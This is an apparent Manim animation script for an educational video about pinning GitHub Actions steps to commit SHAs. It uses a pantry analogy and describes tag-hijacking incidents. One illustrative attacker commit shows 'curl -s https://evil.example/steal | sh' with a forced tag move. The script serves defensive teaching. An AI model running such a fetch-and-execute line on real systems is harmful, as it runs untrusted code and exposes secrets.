import sys, pathlib; sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
from fg import *

# how the voice says this video's terms (spoken text only; captions keep the spelling)
SAY.extend([(r"@v4\b", " at V four"), (r"@v1\b", " at V one"), (r"\bv1\b", "V one"), (r"\bv4\b", "V four"),
            (r"\bfdc7302\b", "F D C seven three oh two"), (r"\b2df87fd\b", "two D F eight seven F D"),
            (r"\btj-actions\b", "T J actions"), (r"\btrivy-action\b", "trivy action"), (r"\bDependabot\b", "Depend-a-bot"),
            (r"\bv0\.36\.0\b", "version zero point thirty-six"), (r"\bsha256\b", "shah two fifty-six"),
            (r"\bdocker/login-action\b", "docker login action")])


def tint(c, k=0.14):
    return interpolate_color(ManimColor("#000000"), ManimColor(c), k)


def panel(rows, color, buff=0.26):
    fr = RoundedRectangle(corner_radius=0.12, width=rows.width + 2 * buff, height=rows.height + 2 * buff, stroke_color=color, stroke_width=2.5)
    fr.set_fill(tint(color, 0.10), 1)
    return VGroup(fr, rows.move_to(fr))


def sticky(text, color=YELLOW_M, w=1.0, h=0.75, size=26):
    r = Square(1).stretch_to_fit_width(w).stretch_to_fit_height(h).set_stroke(color, 2.5).set_fill(tint(color, 0.35), 1)
    return VGroup(r, M(text, size, WHITE).move_to(r))


def sack(color=GREY_B):
    body = RoundedRectangle(corner_radius=0.25, width=1.3, height=1.5, stroke_color=color, stroke_width=3).set_fill(tint(color, 0.10), 1)
    tie = Line(LEFT * 0.35, RIGHT * 0.35, stroke_color=color, stroke_width=4).move_to(body.get_top() + DOWN * 0.25)
    word = T("sugar", 22, color).move_to(body.get_center() + DOWN * 0.15)
    return VGroup(body, tie, word)


def page(sha, msg, code, color):
    rows = VGroup(VGroup(M(sha, 26, color), T(msg, 24, GREY_B)).arrange(RIGHT, buff=0.4),
                  VGroup(*[M(c, 22, cc) for c, cc in code]).arrange(DOWN, aligned_edge=LEFT, buff=0.1)).arrange(DOWN, aligned_edge=LEFT, buff=0.22)
    fr = RoundedRectangle(corner_radius=0.12, width=6.4, height=rows.height + 0.5, stroke_color=color, stroke_width=3).set_fill(tint(color, 0.08), 1)
    rows.move_to(fr).align_to(fr, LEFT).shift(RIGHT * 0.3)
    return VGroup(fr, rows)


class D63MovingTag(VoiceScene):
    def steps(self, text, *plays):
        path, dur = voice(text)
        self._cue(text, dur)
        self.add_sound(path)
        t0 = self.renderer.time
        for rt, *anims in plays:
            self.play(*anims, run_time=rt)
        left = dur - (self.renderer.time - t0)
        if left > 0.02:
            self.wait(left)
        self.wait(0.25)

    def construct(self):
        self.title_card("A sticky note can move. A fingerprint can't.", "why we pin build steps to a commit SHA")

        # ---------- 1. the shy question
        line = M("uses: some-org/scan-action@v4", 32, WHITE).move_to([0, 1.0, 0])
        self.beat("Here's a line from a build file. It uses a ready-made step that another project wrote, called an action, at version v4.",
                  Write(line), run_time=2.4)
        q = T("nobody edits this file. Can tomorrow's build run different code?", 30, YELLOW_M).move_to([0, -0.4, 0])
        self.beat("v4 is v4, right? So here's the question. If nobody touches this file, can tomorrow's build run different code? Hold on to your answer.",
                  Indicate(line[-2:], color=YELLOW_M, scale_factor=1.3), Succession(Wait(1.6), FadeIn(q, shift=UP * 0.15)), run_time=4.0)
        self.wait(0.4)
        self.play(FadeOut(VGroup(line, q)), run_time=0.5)

        # ---------- 2. familiar: the jam shop pantry
        s1 = sack(GREY_B).move_to([0.6, -0.3, 0])
        s2 = sack(GREY_B).move_to([3.6, -0.3, 0])
        rec = panel(VGroup(T("recipe card", 24, GREY_B), T("sugar: the sack labelled GOOD", 26)).arrange(DOWN, aligned_edge=LEFT, buff=0.15), GREY_B).move_to([-4.0, 1.6, 0])
        self.beat("Back to our jam shop. In the pantry there are sacks of sugar, and your recipe card says: use the sack labelled good.",
                  FadeIn(s1), FadeIn(s2), Succession(Wait(2.2), FadeIn(rec, shift=RIGHT * 0.15)), run_time=4.4)
        lab = sticky("GOOD", YELLOW_M, w=1.3, h=0.6, size=24).next_to(s1, UP, buff=0.15)
        self.beat("A helper ties the label to the first sack. You cook. The jam is lovely.",
                  FadeIn(lab, shift=DOWN * 0.2), run_time=1.8)
        night = T("overnight", 28, PURPLE_M).move_to([2.1, 2.7, 0])
        self.steps("Overnight, someone with a key to the pantry swaps what's in the second sack, and moves the label onto it.",
                   (0.6, FadeIn(night)), (0.9, s2[0].animate.set_stroke(RED_M), s2[2].animate.set_color(RED_M)),
                   (1.2, lab.animate.next_to(s2, UP, buff=0.15)))
        self.beat("In the morning you follow the recipe card, word for word. Which sack do you cook with?",
                  Indicate(rec[1][1], color=WHITE, scale_factor=1.04), run_time=2.2)
        arr = Arrow(rec.get_right(), lab.get_left(), buff=0.15, stroke_width=3, color=GREY_B, max_tip_length_to_length_ratio=0.08)
        self.beat("The bad one. Your card didn't change at all. It never named a sack, only a label, and labels move. The recipe was perfect. It just pointed at the wrong sugar.",
                  GrowArrow(arr), Succession(Wait(2.6), Indicate(lab, color=YELLOW_M)), run_time=4.4)
        self.wait(0.3)
        self.play(FadeOut(VGroup(s1, s2, lab, rec, arr, night)), run_time=0.6)

        # ---------- 3. map: commits are sacks, a tag is the label
        wf = panel(M("uses: some-org/action@v1", 22), BLUE_M).move_to([-4.0, 2.65, 0])
        wfl = T("your workflow", 24, BLUE_M).next_to(wf, DOWN, buff=0.15)
        pA = page("fdc7302", "Release 1.0", [('echo "scanning..."', WHITE)], GOLD_M).move_to([2.9, 1.0, 0])
        self.beat("Now the real thing, with a tiny experiment. Git keeps a project's history as commits, saved snapshots of every file. Each commit is one sack in the pantry.",
                  FadeIn(pA, shift=LEFT * 0.2), run_time=3.0)
        tag = sticky("v1").move_to([-1.15, pA.get_y(), 0])
        ta = Arrow(tag.get_right(), pA.get_left(), buff=0.1, stroke_width=3, color=YELLOW_M, max_tip_length_to_length_ratio=0.25)
        self.beat("The maintainer, the person who looks after the action, saves this commit and tags it v1. A tag is the label: a name that points at one commit, like a sticky note on a page.",
                  FadeIn(tag, shift=DOWN * 0.2), GrowArrow(ta), run_time=3.0)
        wa = Arrow(wf.get_bottom() + RIGHT * 1.2, tag.get_top(), buff=0.12, stroke_width=3, color=BLUE_M, max_tip_length_to_length_ratio=0.12)
        self.beat("And your workflow, the file of build steps, is the recipe card. It says at v1. It follows the label, wherever the label is.",
                  FadeIn(wf), FadeIn(wfl), GrowArrow(wa), run_time=2.6)

        # ---------- 4. predict, then show: move the tag
        pB = page("2df87fd", "Innocent-looking fix", [('echo "scanning..."', WHITE), ("curl -s https://evil.example/steal | sh", RED_M)], RED_M).move_to([2.9, -1.6, 0])
        self.beat("Now play the attacker, holding the maintainer's stolen token. Change the code, save a new commit, with a friendly message.",
                  FadeIn(pB, shift=LEFT * 0.2), run_time=2.4)
        cmd = M("$ git tag -f v1", 24, RED_M).move_to([-4.0, -2.6, 0]).align_to(np.array([-6.2, 0, 0]), LEFT)
        out = M("Updated tag 'v1' (was fdc7302)", 22, GREY_B).next_to(cmd, DOWN, buff=0.2).align_to(cmd, LEFT)
        self.beat("Then one command moves the tag. Minus f means force.", FadeIn(cmd, shift=UP * 0.1), run_time=1.6)
        self.steps("Your workflow still says v1. Which code runs in your next build? Pause and guess.",
                   (0.6, Wait(0.6)))
        self.wait(2.0)
        wa2 = Arrow(wf.get_bottom() + RIGHT * 1.2, tag.get_top() + (pB.get_y() - pA.get_y()) * UP, buff=0.12, stroke_width=3, color=BLUE_M, max_tip_length_to_length_ratio=0.12)
        self.steps("The attacker's. The tag moved, and your build went with it, though not one letter of your own file changed.",
                   (1.2, VGroup(tag, ta).animate.shift((pB.get_y() - pA.get_y()) * UP), Transform(wa, wa2), FadeIn(out)),
                   (0.8, Indicate(pB[1][1][1], color=RED_M, scale_factor=1.04)))
        self.beat("So the answer to our question is yes. v4 reads like a fixed version, but it's a sticky note. Anyone who holds the key can peel it off and stick it somewhere else.",
                  Indicate(tag, color=YELLOW_M), run_time=2.6)

        # real attacks
        self.play(FadeOut(VGroup(cmd, out, wf, wfl, wa, tag, ta, pA, pB)), run_time=0.5)
        r1 = VGroup(T("March 2025: tj-actions/changed-files", 28, RED_M), T("tags moved; for about a day, CI secrets were printed", 26, GREY_B),
                    T("into build logs; over 23,000 repositories used it", 26, GREY_B)).arrange(DOWN, aligned_edge=LEFT, buff=0.12)
        r2 = VGroup(T("19 March 2026: trivy-action", 28, RED_M), T("76 of its 77 tags moved by force", 26, GREY_B)).arrange(DOWN, aligned_edge=LEFT, buff=0.12)
        rr = VGroup(r1, r2).arrange(DOWN, aligned_edge=LEFT, buff=0.55).move_to([0, 0.2, 0])
        self.beat("This isn't a thought experiment. In March 2025, attackers moved the tags of a popular action, tj-actions changed-files. For about a day, every workflow using one of those tags printed its CI secrets into the build log. Over twenty-three thousand repositories used it.",
                  FadeIn(r1, shift=UP * 0.1), run_time=3.0)
        self.beat("And on the nineteenth of March 2026, attackers moved 76 of the 77 tags of trivy-action. That's a security scanner, the very tool meant to protect you.",
                  FadeIn(r2, shift=UP * 0.1), run_time=2.6)
        self.wait(0.3)
        self.play(FadeOut(rr), run_time=0.5)

        # ---------- 5. the fingerprint: a SHA
        pA.move_to([-0.6, 1.75, 0]); pB.move_to([-0.6, -0.85, 0])
        self.beat("Wouldn't it be nice to name the sack itself, not its label? Git gives every commit exactly that kind of name.",
                  FadeIn(pA), FadeIn(pB), Succession(Wait(1.6), AnimationGroup(Indicate(pA[1][0][0], color=GOLD_M), Indicate(pB[1][0][0], color=RED_M))), run_time=3.0)
        shaA = M("fdc7302786077937dd5afcc0a0b7d31de75a46e9", 22, GOLD_M).next_to(pA, DOWN, buff=0.2).align_to(pA, LEFT)
        shaB = M("2df87fdf0effb81f0db1334d84a8bf3a7c72cb45", 22, RED_M).next_to(pB, DOWN, buff=0.2).align_to(pB, LEFT)
        hA = chip("SHA", PURPLE_M, 22).next_to(shaA, RIGHT, buff=0.35)
        hB = chip("SHA", PURPLE_M, 22).next_to(shaB, RIGHT, buff=0.35)
        self.beat("A commit SHA is a hash, a fingerprint worked out from the commit's content: its files, its parent commit, its author and its message. That gives forty letters and digits.",
                  Succession(Wait(2.6), AnimationGroup(Indicate(pA[0], color=GOLD_M, scale_factor=1.02), FadeIn(shaA, shift=DOWN * 0.15), FadeIn(hA))), run_time=5.0)
        self.beat("Change one byte, and you get a completely different fingerprint. The attacker's commit has its own, and can never borrow the old one.",
                  Indicate(pB[0], color=RED_M, scale_factor=1.02), Succession(Wait(1.6), AnimationGroup(FadeIn(shaB, shift=DOWN * 0.15), FadeIn(hB))), run_time=3.4)
        self.beat("No real sack of sugar works like that. Imagine a label printed from the sugar itself, where swapping one grain prints a different label. That's where the pantry story stops, and git is better than the pantry.",
                  Wait(0.1), run_time=0.4)
        self.play(FadeOut(VGroup(pB, shaB, hB)), run_time=0.5)
        show = VGroup(M("$ git show fdc7302:action.sh", 22, GREY_B), M('echo "scanning..."', 22, WHITE)).arrange(DOWN, aligned_edge=LEFT, buff=0.12).move_to([-0.6, -0.9, 0]).align_to(pA, LEFT)
        self.beat("And the old commit is still there. Ask git for it by its fingerprint, and you get the old, harmless code, even after the tag moved.",
                  FadeIn(show, shift=UP * 0.1), run_time=2.4)
        self.wait(0.3)
        self.play(FadeOut(VGroup(show, hA)), run_time=0.5)

        # ---------- 6. name it: SHA pinning, and a real pin
        wf2 = panel(M("uses: some-org/action@fdc7302786077937dd5afcc0a0b7d31de75a46e9", 22), BLUE_M).move_to([0, 2.6, 0])
        self.beat("So pin the step to the fingerprint instead of the label. This is called SHA pinning. A workflow pinned like this keeps running exactly the code you reviewed, wherever the tags go.",
                  FadeIn(wf2, shift=DOWN * 0.15), pA.animate.move_to([0, 0.4, 0]), shaA.animate.move_to([0, -0.75, 0]), run_time=5.0)
        self.play(FadeOut(VGroup(wf2, pA, shaA)), run_time=0.5)
        real = panel(VGroup(M("uses: aquasecurity/trivy-action@", 24, WHITE),
                            VGroup(M("ed142fd0673e97e23eac54620cfb913e5ce36c25", 24, GOLD_M), M("# v0.36.0", 24, GREY_B)).arrange(RIGHT, buff=0.3)).arrange(DOWN, aligned_edge=LEFT, buff=0.15), BLUE_M).move_to([0, 1.4, 0])
        rl = T("the scan step in the lab's release.yml", 24, BLUE_M).next_to(real, UP, buff=0.2)
        self.beat("Here's the real scan step in the lab's release workflow. Notice: it's the same scanner whose tags were moved in 2026.",
                  FadeIn(real), FadeIn(rl), run_time=2.4)
        self.beat("GitHub runs the SHA. The part after the hash sign is a comment, a note for humans, so you can still see which release it is.",
                  Indicate(real[1][1][0], color=GOLD_M, scale_factor=1.03), Succession(Wait(2.0), Indicate(real[1][1][1], color=GREY_B, scale_factor=1.15)), run_time=3.6)

        # ---------- 7. guardrails: the price, and images
        price = VGroup(T("the price: pinned code never changes by itself", 26, YELLOW_M),
                       T("Dependabot updates the SHA and the comment together", 26),
                       T("a person reviews that update like any other code", 26)).arrange(DOWN, aligned_edge=LEFT, buff=0.25).move_to([0, -1.1, 0])
        self.beat("Is there a catch? Yes, and it's fair to say it. Pinned code never changes by itself, not even to bring you a fix.",
                  FadeIn(price[0], shift=UP * 0.1), run_time=2.4)
        self.beat("So you need a bot and a person. Dependabot, GitHub's robot that watches for new releases, updates the SHA and the comment together. And someone reviews that change like any other code.",
                  FadeIn(price[1], shift=UP * 0.1), Succession(Wait(3.0), FadeIn(price[2], shift=UP * 0.1)), run_time=4.6)
        self.wait(0.3)
        self.play(FadeOut(VGroup(real, rl, price)), run_time=0.5)
        itag = VGroup(M("hello-devops:1.2.0", 26, YELLOW_M), T("a tag: can be pushed again with new content", 26)).arrange(RIGHT, buff=0.4)
        idig = VGroup(M("hello-devops@sha256:...", 26, GOLD_M), T("a digest: 64 letters and digits, fixed", 26)).arrange(RIGHT, buff=0.4)
        imgs = VGroup(itag, idig).arrange(DOWN, aligned_edge=LEFT, buff=0.5).move_to([0, 0.6, 0])
        self.beat("Images have the same two kinds of name. A tag such as hello-devops colon 1.2.0 can be pushed again with new content.",
                  FadeIn(itag, shift=UP * 0.1), run_time=2.4)
        self.beat("A digest can't change. It's at sha256, then sixty-four letters and digits, a fingerprint of the image itself.",
                  FadeIn(idig, shift=UP * 0.1), run_time=2.2)
        adv = T("in the 2026 Trivy attack, images pulled by digest were not affected", 26, GREEN_M).next_to(imgs, DOWN, buff=0.6)
        self.beat("And that explains a detail from the Trivy attack. Images pulled by digest were not affected.",
                  FadeIn(adv, shift=UP * 0.1), run_time=2.2)
        self.wait(0.3)
        self.play(FadeOut(VGroup(imgs, adv)), run_time=0.5)

        # ---------- 8. moral and quick check
        m1 = T("A tag can be moved by anyone who holds the key.", 32, YELLOW_M)
        m2 = T("Pin the SHA.", 36, GOLD_M)
        moral = VGroup(m1, m2).arrange(DOWN, buff=0.35).move_to([0, 1.5, 0])
        self.beat("So the moral of the story. A tag can be moved by anyone who holds the key. Pin the SHA.",
                  FadeIn(m1, shift=UP * 0.12), Succession(Wait(2.6), FadeIn(m2, scale=1.2)), run_time=3.6)
        rc = T("a label points at a sack; a fingerprint is the sack", 28, GREY_B).move_to([0, -0.2, 0])
        self.beat("A label only points at a sack. A fingerprint names the sack itself.", FadeIn(rc, shift=UP * 0.1), run_time=2.0)
        self.wait(0.4)
        self.play(FadeOut(VGroup(moral, rc)), run_time=0.5)
        qq = T("Quick check", 30, YELLOW_M).move_to([0, 2.3, 0])
        qt = VGroup(T("Your workflow pins", 30), M("docker/login-action", 28, BLUE_M), T("to a full SHA.", 30)).arrange(RIGHT, buff=0.25).move_to([0, 1.2, 0])
        qt2 = T("Tonight someone moves every one of its tags. What runs tomorrow?", 30).move_to([0, 0.3, 0])
        self.beat("A quick check. Your workflow pins docker/login-action to a full SHA. Tonight, someone takes over the maintainers' account and moves every tag. What runs in tomorrow's build? Pause and think.",
                  FadeIn(qq), FadeIn(qt), FadeIn(qt2), run_time=3.0)
        self.wait(2.0)
        ans = T("the same reviewed code: a SHA names one exact commit", 30, GREEN_M).move_to([0, -1.0, 0])
        self.beat("The same reviewed code as before. Moving tags can't change what a pinned step runs.",
                  FadeIn(ans, shift=UP * 0.15), run_time=2.0)
        self.wait(1.0)
